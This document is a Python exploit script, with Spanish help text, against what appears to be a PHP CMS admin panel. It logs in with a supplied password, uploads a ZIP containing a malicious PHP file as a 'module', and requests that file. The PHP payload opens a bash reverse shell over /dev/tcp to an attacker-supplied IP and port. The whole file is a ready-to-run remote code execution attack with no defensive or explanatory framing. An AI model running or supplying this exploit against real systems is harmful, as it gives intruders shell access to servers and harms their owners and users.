#!/usr/bin/python3
import os
import zipfile
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
import argparse

def create_payload(ip_attack, port_attack):
    print('[+] Creating payload')
    return f"<?php echo system(\"bash -c 'exec bash -i &>/dev/tcp/{ip_attack}/{port_attack} <&1'\")?>"

def create_file(ip, port, file_name_php):
    payload_content = create_payload(ip, port)
    print(f"[+] {'Creating' if not os.path.exists(file_name_php) else 'Overwriting'} .php file")
    with open(file_name_php, 'w') as payload_file:
        payload_file.write(payload_content)
    return file_name_php

def create_zip(file):
    zip_file_name = 'malicious_file.zip'
    print('[+] Creating ZIP file')
    with zipfile.ZipFile(zip_file_name, 'w') as zipf:
        zipf.write(file)
    return zip_file_name

def upload_zip_malicious(file_name_zip, host, password,file_name_php):
    login_url = f"{host}/login.php"
    upload_url = f"{host}/admin.php?action=installmodule"
    headers = {"Referer": login_url}
    login_payload = {"cont1": password, "bogus": "", "submit": "Log in"}

    with requests.Session() as session:
        login_response = session.post(login_url, headers=headers, data=login_payload)

        if login_response.status_code == 200:
            print("Login successful")
            with open(file_name_zip, "rb") as f:
                multipart_data = MultipartEncoder(
                    fields={
                        "sendfile": ("mirabbas.zip", f, "application/zip"),
                        "submit": "Upload"
                    }
                )

                upload_headers = {
                    "Referer": upload_url,
                    "Content-Type": multipart_data.content_type
                }

                upload_response = session.post(upload_url, headers=upload_headers, data=multipart_data)

                if upload_response.status_code == 200:
                    print("[+] ZIP file uploaded successfully")
                else:
                    print("[+] Error uploading ZIP file. Response code:", upload_response.status_code)
        else:
            print("[+] Login failed. Response code:", login_response.status_code)

        rce_url = f"{host}/data/modules/mirabbas/{file_name_php}"
        rce_response = session.get(rce_url)
        
        #print(rce_response.text)
        

def main():
    parser = argparse.ArgumentParser(description='Script para crear y subir un archivo ZIP malicioso.')
    parser.add_argument('--password', required=True, help='Password para login')
    parser.add_argument('--filename', default='malicious.php', help='Nombre del archivo PHP a crear')
    parser.add_argument('--ip', required=True, help='IP del atacante')
    parser.add_argument('--port', required=True, help='Puerto del atacante')
    parser.add_argument('--host', required=True, help='URL del host objetivo')

    args = parser.parse_args()

    file = create_file(args.ip, args.port, args.filename)
    zip_file = create_zip(file)
    upload_zip_malicious(zip_file, args.host, args.password,args.filename)

if __name__ == '__main__':
    main()
